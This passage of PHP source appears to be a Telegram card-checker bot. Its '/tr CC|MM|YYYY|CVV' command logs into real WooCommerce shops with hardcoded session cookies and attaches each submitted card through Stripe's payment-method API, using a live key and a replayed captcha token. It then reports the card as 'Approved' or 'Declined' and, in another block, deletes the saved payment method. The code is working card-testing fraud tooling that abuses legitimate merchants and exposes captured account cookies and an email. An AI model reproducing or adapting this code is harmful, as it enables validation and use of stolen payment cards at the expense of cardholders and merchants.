sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'referer: https://tayhope.com/my-account/add-payment-method/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);

$response = curl_exec($curl);
$err = curl_error($curl);
$patron = '/\/\d+\/\?_wpnonce=[a-f0-9]+/';
preg_match($patron, $response, $coincidencias);
$url_nonce = $coincidencias[0];
curl_close($curl);

echo "$url_nonce\n";




$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://tayhope.com/my-account/delete-payment-method'.$url_nonce.'',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => '__stripe_mid=f87acd8c-3c42-492d-a089-d786e071117723820f; wordpress_logged_in_c070ca56ecb509fdfa7f9f75c40ac645=reech1951%7C1732924778%7C69TKrBK1V9SgCsX2ZOLdaRX6UOxgRfN40Uu1MjesFic%7C0bb916415e9e6e6e5ee677ab1839392de7209173e898fec8aec33a853e8efcf4; wp_woocommerce_session_c070ca56ecb509fdfa7f9f75c40ac645=200%7C%7C1731887937%7C%7C1731884337%7C%7C8d1d339670b9baedf6f1ed5a0529c4cb; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-16%2023%3A15%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F%3Fvisit_international_btn%3Dtrue%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-16%2023%3A15%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F%3Fvisit_international_btn%3Dtrue%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; dontshow=true; __stripe_sid=11efb66d-58d1-4ed6-8c61-1ab112b42f2d0fc954; woocommerce_items_in_cart=1; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fpayment-methods%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'referer: https://tayhope.com/my-account/payment-methods/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);


} elseif ($success === true && $status === "requires_action") {
    $respo = "3DS Authenticate Rejected ❌";
} else {
    $respo = $message;
}


$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";


if (empty($respo)) {
        $respo = $response;
}


if (array_in_string($respo, $live_array)) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Stripe 3D\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Approved! ✅\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Stripe 3D\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Declined ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
} else {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Stripe 3D\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Gate Error❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
}

if ($live) {
    editMessage($chat_id, $respuesta, $id_text);
} else {
    editMessage($chat_id, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();

}
	
	
elseif((strpos($message, "!tr") === 0)||(strpos($message, "/tr") === 0)||(strpos($message, ".tr") === 0)){
$tr = explode(" ", $message);
$tr = ltrim($tr[0], "/.!"); // elimina /, . o ! del inicio del primer elemento del arreglo
if ($tr == "trad") {
    die();
}
	
$lista = substr($message, 4);
$i = preg_split('/[|:| ]/', $lista);
$cc    = trim($i[0]);
$mes   = trim($i[1]);
$ano  = trim(substr($i[2], -2));
$cvv   = trim($i[3]);

$bin = substr($lista, 0, 6);
$num = "$cc$mes$ano1$cvv";
//-----------------------------------------------------//

//Verifi//
if (!is_numeric($cc) || strlen($cc) != 16 || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
    $respuesta = "🚫 Oops!\nUse this format: /tr CC|MM|YYYY|CVV\n";
    sendMessage($chat_id, $respuesta, $message_id);
    die();
}



//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
        //----------------------------------------------------//

$longitud = 4;
$partes = [];
for ($i = 0; $i < strlen($cc); $i += $longitud) {
    $parte = substr($cc, $i, $longitud);
    $partes[] = $parte;
}

$cc = implode('+', $partes);

$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin

///EXTRAE EL NONCE//
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.thetravelinstitute.com/my-account/add-payment-method/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,                                                                CURLOPT_TIMEOUT => 30,                                                                  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,                                          CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'payment_method=stripe&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=&wc-stripe-is-deferred-intent=1&wc-stripe-new-payment-method=true&i13_recaptcha_payment_method_token=03AFcWeA6foAp_rGd2sG9ZMJLBe-M4eaFwhSZbI0_m48A3FwGDjldZvu7c9cYidlfJIfJRuz_f2cqn-3U8Lp9YAcTmv8s8wQPvzHojpHeIDwAg0OoB04f-pqYcDYrlhs22DIak-XTN7amGQTwXRsooPHW8rAK7hp0FbQI69PQJyIZ-EOx4xT7A52t5e5FjfEjFegwAbKZ9pL3LqMGPOkzo25TkH7l1FFm_X5uFrIRIBbyLuKS3rRox0Tr983Leigv1j5_K5MYM0B7ot2mthbC7G5kT2qqxlnW01bbeNy81h-eMrHYLqv_kZv1-EsccxNf7nsZg2EWlPqAYuLyVdX9G7ODKgeV2-xF3agKKRB5CMWqC03D8xQsOb3FyDf1UCtppGU-taMXGnIkJd1GRHcqBQLKXz-FoUUVgiIAoQUXUP2eCvBLBitNHCFNiS0f0LGgBAFGB-2nAmZpdiCX5NTCuxA9xJ9yDeG5djLpiRGdgLTC8H5A1D0Weo6Lc9-4D4VQtlUde1icdvkFlMzQtwlktDh3jcV3kCsOoLrupcBj8rt1EXBOlQCzUSbLE9l9SdTYx7-Q3Ep3eyFlh4aFrOR-t8RqzFDlufbWI5Hyfa49Xo_GdRpnkm9I5iGYb-Le-Mqf6hkNRoM9LBd1-czOUTLgY-7j2WKOCRxNZpo1nO2qQXrxjemn9KkL1Khs1PhjgpNvVYQ5nJYoTNwkiAg_0YeWW11rSsHQi25o1U6zrN1FtLHzAWird-hpcznfTXzTKZp6lWHfs5RHcP5xEEMGu6u51YPoJnln2LbvH_uLrbYLd6ithc4a9eI2w2wUJs4mnlSl1mjuEadLerVHuo5nbxDMZIjcP96KFJx6tfL-mux-DTwBnvYhN5cbF3XfaoritS5gKef5D0OKHfdzWqRUkfJz5Fq2URv9KhsfTua4sjvKpQI2RM9r8pbDWLvE0nij4jA_m1XG327U9fsFdZI-DudmnOTI5Xb1bN1BaOr3emqIK6IVu4MzCYcwH2chj6O5Ej1LCK00FudRwcRJVm_y8CIy0B8rt67Yav3HQc9wHhEGYk-tPTz4y_rFGfA2k1QZMvWtDieDoOcRAE41waNKV6a9Nji-A3Rv4ZdZWD6f_PBgexDt_tjkx2aghGHr901kpUQlr7bXbPEumSCLKeoJRy28nlgIqZx0Rv-gPSi7BtxsSO2Ls43G4tuUoXPPJSORcigzr742uC65fzk-CEaonjWEE9sdQYn7GRquKGDIexa3gGUm2UNOkkUEaCrnd2HdGk0xiWGUbGx9DxvHPb6YBWgnb-LsNohZ-Etjhh1BuHcnpr8oAC0X2FVlGca3LU-xkmgf6F38SABqxNog420Nqr8atEzgoCq4NXOlfXwAKvJKDx_NWWEss4mAMERdCEP87U7cwr7u8V-aOLLaOTHNKZTt73ly9Kjxz8AbjsuR2gvmTNziDlD5ReUKNgrXelvxxy8xfF6pz5dYxUOrR4mfSI3SfofuLboxxnWBJbfYMj-UG0bPCymLkqBRIRy_Wfw85bDibZ1G22011gEwwSRmlFWf8K92AfThrmxTXNBd4pqquEg6oFm2YlB7ycv8gmHYxf4czrpSbpDNC2h1ZZMxwa0xkhXM56yh90YLElhJ8HVyAOHVCf8eKGwWRzzAOtJrSHqhiZq6YOwlc3QXCFb97LJSxGbDfsei-I7GQGC2-FCh2cv4NJHb2ioqO-T19CNGfbSbcdUvVs-p0juJ6g4CBOkTQIxD8gM3Sv7p5afTme_xYZfQyAr6PscuFj1uLaq-0N7FNkPRrt9583bsXg1rOwLa-SudO8nOultL7HIBLfi3tqkFbdbhA_0pcKDZRuF_h3ZhT7gbPtlMtrxcN6fVtRBTBe1U5bEiCbcg0jbPH5BhdYG9R1oeRuSUsp9aHL-EMJy7dwQ8bMMY55K_i9qPm-SnFvvuxVSR8gkdRrGL-yIi4GjnZBSODuT-9Ac6ipQE5YLyexcR755QghPEW6--mvgkPrt5SZH3uhylqrVKZOK9d6w-kYpg9ZGWSmTo9c6SUdQGR1jakc9rPodr7XVUytge3zqMt2oZf5OiIhapvXD16WqJ-oYOYvifG5l_LpsLytczI_kkA_Q7qFcsNWf8hUiJ5JSlCzy5xGSm-tgXT3YeulMizWlb4RoGQVpHzBSbNKzVTxAb86vHOanikS5F_2q1twDVV4mzyknIN1GkdXlRPtsPfHS64BE8ZEIyrrEbmX2opz6grvUHTMyEVZ4BeolTdTdEIl3INkSBzdU842cXr7OKxr1B_-ESe2YQ&woocommerce-add-payment-method-nonce=a7151db41c&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1',
  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; __stripe_mid=2e26787c-c102-4578-aa4b-fba54c859921bb7405; mailchimp_user_email=Dausitherer%40cuvox.de; wordpress_logged_in_104df0bcc01c764423018f9bcd47f262=dausitherer%7C1737508507%7CkQ0NDWvxtUSzjUm9y4tHOdo87KOvxxrAfqXeXAcly6L%7Cb88250a3e9f28c7927434437f6a2d7da9ae501cf6b279b861491bb8baa209e03; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F; __stripe_sid=c8b725f0-d8a9-4fd4-ad28-2cea16b61ba4cd0533',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'Content-Type: application/x-www-form-urlencoded',
    'cache-control: max-age=0',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'upgrade-insecure-requests: 1',
    'origin: https://www.thetravelinstitute.com',
    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.5',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: navigate',
    'sec-fetch-user: ?1',
    'sec-fetch-dest: document',
    'referer: https://www.thetravelinstitute.com/my-account/add-payment-method/',
    'priority: u=0, i',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
// Extraer nonce
$patron_nonce = '/"createAndConfirmSetupIntentNonce":"([^"]*)"/';
preg_match($patron_nonce, $response, $matches_nonce);
$nonce = $matches_nonce[1];
curl_close($curl);
echo "$nonce\n";



///EXTRAE EL ID////
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&billing_details%5Baddress%5D%5Bpostal_code%5D=10080&billing_details%5Baddress%5D%5Bcountry%5D=US&payment_user_agent=stripe.js%2Ff998a153d0%3B+stripe-js-v3%2Ff998a153d0%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.thetravelinstitute.com&time_on_page=33566&client_attribution_metadata%5Bclient_session_id%5D=c9054b3a-2bfb-44df-8260-a7c7b5de1e1f&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=fa5d9d41-7dd0-489e-8250-c0f3517b2a9164221b&muid=2e26787c-c102-4578-aa4b-fba54c859921bb7405&sid=c8b725f0-d8a9-4fd4-ad28-2cea16b61ba4cd0533&key=pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX&_stripe_version=2024-06-20&radar_options%5Bhcaptcha_token%5D=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5Ijoid1dMTmVKWTMrZlpTQi9MRlBocjI4cmxUTWd3N2Y3TVlRQ3g0dUM0T2Ezam0xeE1wQmxrczBaYTlqYitkUWhaVGpEQVlPYzJIMjdRNjMrWFZKN01YaTE2VFJFOUl5K2s0dEk5d2dKSHpyNTBzSittU2JHZVJlWGdwMHoydFVVd3U5R1loellscGU0N01BZnlXdXpZNlFvMEZVS3ZQd2xiV1JMVmFldjFwNEk2VFdUL1IxeFdpd3AxL052cks3dzZiMTB0eGNzR2w0d2ZEbHdNWTNyR0o0Z3paK0s0aGt1bzVxYkcwb2lpdHhtazRMQlZGQ2ROeElXMGtDQXltazM3cldrNXc3dVY4SE1sZ2tWZ0VCOUt4YTNqSE1mcThkczk1OWZSVlVoVkRmL3U1cWk0a1h2alkxZGhVQk1FQWFmRi9kd3I1Vjdsd0tjcmtNb25ueHFLTHBZRHVmdEV1L1lpeCtMVzYxOS9LOGdtVjJIVERWRFZ2d0JKMG9JclpOeEFYdEsxanhrMmMvc3FlZ2E3Q3VTVGdud3lYNFI0Nk1laGduU3dWNndscU56dDcyaGJ2V25OTGRmMmNGUVBSKzJHSEhHLy9tWFl0V0ZzV3JOM2lRa04xVmFtU1RLYkJZSEVGd2RCUGlTVjFtZndhZnFsY1VsZW5FcHJaNFM1ckFZY3g0THgxaFB0ZHYxNEdFN2VDZ2w1RmJiMEtkS2ZDQzA4L1ZyOTFpcDlTN2hJQVlFS2NBNGtLbVNoaE1lbWtsNDFJTmpFc3lLdDJKeUx6RUhqeXFqTWppTVpWOUlMS2FnZ2ZBOWRFalI4empOelk1RXBnNmNuRmdjUHJMQjBYbEl1aWNUNStQU2FMVmM2d2R4L3ArOW1iMFVMMXduQWJkbE0wVDlLMjd3eFRmaXVCZVA3RVhQQlMxaDA4aVpmK1o0UDcyRmJXZVdIbmx0bWZ5dUxFRnJQTTduZEsvOHlnalV3S25PeTF6aXBQSktkZnJNNmtZWFhMNUVRVFowY2NXNnlIUTdzWC8yQTNIdVBWcWhUVmt2NjhjTnppQzlnaFNIODlFNGVUbkFnYzdrYnQySHhVQ3ZEeDZvNGNiTFRuaHNYK05iR2E4MVg5clRXU2xxZkQ4emFWU2YwRG1CaExCa3A2TEZjZVFmNERKWWpJdFREVm8zQVlkdFZXYWV0bjBvVTU1ZkxySTZFZWF1RURhaEk3b0J3SUVYWlhEYWN5L1o5UGhnVlJaUk5SMDBuU0NHd2dKY0s2akJ4QW0xNGREOHlmZXF4eWxiREd2V2RNbTdQdmp6Vnp3b05HbnRWS2hHSXlkOFVlN3ppV05LS0ZlRkdpWVdGWnMzV255OHUzbHVpT243VjlYU2tRekdlQjk2Z2NzY1QyU21hQlNJQkNZNnVWOUw0eEVGOXBRY2hCRFM2ZVdKelZMd1ZVREFBbTdMMytMdEhCZVpRbXlDRFhHaVdxSC9xQkl4SHpxamZXdFovZUZqNU9SMThFTi85bS8wSTl5clRJd1RSM1VoeUxYR0g5T0Nla2hYOXM4T3VqMXJaYjlobVNJR2lrVWh5MUxSd24ySFUwbTNGWGhYYUdqSnBvdEQ2aXhHVWhMRzRmck1pcktWL1BjSHpnaENLQkhnYTkvVUR3Y05uTzJ0QTdzTkZMYkNBTDZwS2RuZVlqQUFJS2Y0Y3MvRlBZR2NFUWp4RisvME5NdkN4L0NpUW1UWWVMTTJHT1lGUlZwZjFlS0xscUJEZzZ4N3grMTQxZzZ6UW5mdE1nUXM2aTV0SzRuejdJbndoU2Y1cTRwQy8rUjRKcDJrRUZ3N0tvai9WODBicE54SmwrbjZhU0NFdmpKMys1d2p3Y3VDZXdVeFh5V3F6bDQ5ZXpWRnpuclJENUErVUo4Uk5xUEMxT29Zelo2YWRMWjhnalRMWE9BRmJ0UVZlc3VHZm8wOUZUTzliSStkVUpHNndtTURIdHdld2hUbjNQc0VkQVBRUG5qU3hqWE40TlVJcDQzWm9CVnFXU2toSjl3VXRjWVlDVmd4UFJBZjV2Vzd4bTBHckl2VS9RYmhCSzRma0tORjhlWDlINnMrUE9HcTVwcExZU0VxMjNRemRXVTRaK3E2WUlzbGg2VWc2NmJLN0c4VE5hVkpnZDBMZGdzY3dBSWo4S21qdElxaEhoVTI4eTlCaFhYMzhhRW9RMk1uZFdOR3ZBRzhIb3RabFVjK2hPQ3I0WHZCbzFwMlNma1ZjbGM1Um1zY2tMSURMYUpFMGxZYTE3VEJUZzVMY2pZUVRhQ2YzMXp5ZWtML05aSUZTMTJLUjF2YmE4a3lOL2xiUlJ5VG9RdUNhLzBxYnJlbEFITDg1M1p2TkZVTFQ5ZWZQdkR6KzFjR21wVUd5Z3QzNjBwa3k2azNuWEtDb2FXYmlsS1hoRHIwRWV6ZDNTK2I2bjV4VVBLcS9nZCt4ZW1nazQwNTUwS3QrcVNKd0Q5Y1pMWXZDemlOZm94YS9IcEtrZkZ6Z2o0UFZ3WTlUMmIyNlFtaTIySWVDbjRXcmltMnFGSHA3U25tczlVYVBOZTBtckFNMXZZeXBZRVY0eTY1b3lyMHV1S0NhOFRMNDFZdHZsSndlUmx3aVY1ZEROYkhGOTJUSUt6Q1Fycko2U2Q3Q1lsRVdLZWc4YkdrT0lwSFJEUmg4RFB3emQ4NForSWo5TW9nd1JqTmtsYzFmd05NMFJHaTVKR2RlenRRPT0iLCJleHAiOjE3MzYzMDMyMjcsInNoYXJkX2lkIjoyMjE5OTYwNzMsImtyIjoiMzhhZmU0NTYiLCJwZCI6MCwiY2RhdGEiOiJGdjl4TDd0dnd4ck8wc0NYaTNTYkNNRE92aFlnSU1kVGVtQnp4N1I2MWlYYzdORG15TVFCTFVnY2d1THlpTEYxbUIyVVRsVTQyOTBsQjN5eXFRa3hSbkZINzdaaXAvaitTVVVpNkY3SERIcWpzOVFZbzlvTTVyTXFFRHFneXA2NmRtcjBtZ0xjeFkwOE9RbWY1ZFVVM0J3bmh2bWpRemtEWXRJenVMb3pWV2VudGtLcGxlTVErbGZtbCs3U2F0ZmVRQytkUkNWeU4vQXBQVE5wIn0.DGsmA4QzCei_0e4Y2dNPChVr6kdtI2v11J6RtEMpkFo',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'Accept: application/json',
    'Content-Type: application/x-www-form-urlencoded',
    'sec-ch-ua-platform: "Android"',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.5',
    'origin: https://js.stripe.com',
    'sec-fetch-site: same-site',
    'sec-fetch-mode: cors',
    'sec-fetch-dest: empty',
    'referer: https://js.stripe.com/',
    'priority: u=1, i',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$id = $json["id"];
curl_close($curl);



$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.thetravelinstitute.com?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'action=create_and_confirm_setup_intent&wc-stripe-payment-method='.$id.'&wc-stripe-payment-type=card&_ajax_nonce='.$nonce.'',
  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; __stripe_mid=2e26787c-c102-4578-aa4b-fba54c859921bb7405; mailchimp_user_email=Dausitherer%40cuvox.de; wordpress_logged_in_104df0bcc01c764423018f9bcd47f262=dausitherer%7C1737508507%7CkQ0NDWvxtUSzjUm9y4tHOdo87KOvxxrAfqXeXAcly6L%7Cb88250a3e9f28c7927434437f6a2d7da9ae501cf6b279b861491bb8baa209e03; __stripe_sid=c8b725f0-d8a9-4fd4-ad28-2cea16b61ba4cd0533; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-01-08%2002%3A23%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2025-01-08%2002%3A23%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'x-requested-with: XMLHttpRequest',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'sec-ch-ua-mobile: ?1',
    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.5',
    'origin: https://www.thetravelinstitute.com',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: cors',
    'sec-fetch-dest: empty',
    'referer: https://www.thetravelinstitute.com/my-account/add-payment-method/',
    'priority: u=1, i',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
//------------------------------------------//
//$message = $json['data']['error']['message'];
$message = str_replace("Error: ", "", $json['data']['error']['message']);
$success = $json['success'];
$status = $json['data']['status'];
curl_close($curl);

if ($success === true && $status === "succeeded") {
    $respo = "Approved! ✅";

$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.thetravelinstitute.com/my-account/payment-methods/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
